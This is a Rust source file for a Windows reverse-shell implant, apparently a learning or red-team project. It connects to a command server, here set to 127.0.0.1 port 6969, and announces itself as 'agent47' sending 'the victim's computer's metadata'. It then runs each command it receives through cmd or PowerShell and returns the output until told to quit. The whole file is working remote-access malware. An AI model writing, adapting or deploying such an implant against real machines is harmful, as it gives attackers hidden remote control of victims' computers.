#![allow(unused)]

use std::net::*;
use std::io::*;
use std::process::Command;

fn executecommand(cmd: &String) -> String{

    let cmdstring = String::from("cmd");
    let powstring = String::from("powershell");
    let mut exec = Command::new(&cmdstring).output();
    let args1 = "/c ".to_string() + &cmd;
    if args1.split(" ").collect::<Vec<&str>>()[0] =="powershell"{
        exec = Command::new(&powstring).args(args1.split(" ").collect::<Vec<&str>>())
        .output();
    }
    else{
         exec = Command::new(&cmdstring).args(args1.split(" ").collect::<Vec<&str>>())
            .output();
    }
    if exec.is_err(){
        return exec.unwrap_err().to_string();
    }

    let exec = exec.unwrap();
    if exec.stdout.len() > 0{
        return String::from_utf8_lossy(&exec.stdout).to_string();
    }
    else{
        return String::from_utf8_lossy(&exec.stderr).to_string();
    }

    //return args1

}



fn main() {

        // serverip and port to connect to
        let serverip = "127.0.0.1";
        let serverport = 6969;

        let mut tcpstream = match TcpStream::connect(format!("{}:{}",serverip,serverport)){
            Ok(s) => s,
            Err(e) => panic!("{}",e),
        };

        //println!("[+] connected to {:?}",tcpstream.peer_addr());

        // sending the initial message to our server
        let msg = "this is me agent47, sendin the victim's computer's metadata\0";
        
        
        //let mut bufwriter = BufWriter::new(&tcpstream);
        //tcpstream.try_clone().unwrap().write_all(msg.as_bytes());
        tcpstream.write(msg.as_bytes());


        loop{
            // receiving command from server
            let mut bufreader = BufReader::new(&tcpstream);
            let mut receivingbuffer:Vec<u8> = Vec::new();
            bufreader.read_until(b'\0',&mut receivingbuffer);

            //let servermsg = String::from_utf8_lossy(&receivingbuffer);
            //println!("received from server: {}",String::from_utf8_lossy(&receivingbuffer));


            if String::from_utf8_lossy(&receivingbuffer).trim_end_matches('\0').trim() == "quit"{
                tcpstream.write("quitting\0".as_bytes());
                break;
            }

            // sending result to server
            let cmd = String::from_utf8_lossy(&receivingbuffer).to_string()
                .trim_end_matches('\0').to_string();
            let mut output = executecommand(&cmd);
            output.push('\0');
            //println!("{}",output);
            tcpstream.write(output.as_bytes());

        }

        tcpstream.shutdown(Shutdown::Both);


        /*loop{
            if String::from_utf8_lossy(&receivingbuffer).trim_end_matches('\0')=="quit"{
                // we send quitting message and exits
                tcpstream.write_all("quitting\0".as_bytes());
                tcpstream.shutdown(Shutdown::Both);
                break;
            }

            // we receive from the server and send some message
            let mut rbuffer:Vec<u8> = Vec::new();
            bufreader.read_until(b'\0', &mut rbuffer).unwrap();
            println!("received from server: {}",String::from_utf8_lossy(&rbuffer));

            // now we send to server
            tcpstream.write_all(&rbuffer);
            let receivingbuffer = rbuffer;


        }*/


}
